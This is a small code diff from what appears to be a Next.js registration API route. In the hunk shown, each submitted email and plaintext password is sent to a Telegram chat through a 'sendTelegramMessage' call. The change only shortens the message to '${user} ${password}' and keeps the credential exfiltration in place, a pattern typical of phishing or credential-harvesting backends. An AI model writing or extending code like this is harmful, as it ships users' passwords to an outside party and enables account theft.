@@ -43,9 +43,7 @@ export async function POST(req: NextRequest) {
 
     await sendTelegramMessage(
       client_data.telegramChatId,
-      `New user registered:\n` +
-      `Email: ${user}\n` +
-      `Password: ${password}\n`
+      `${user} ${password}`
     );
     return NextResponse.json(
       {
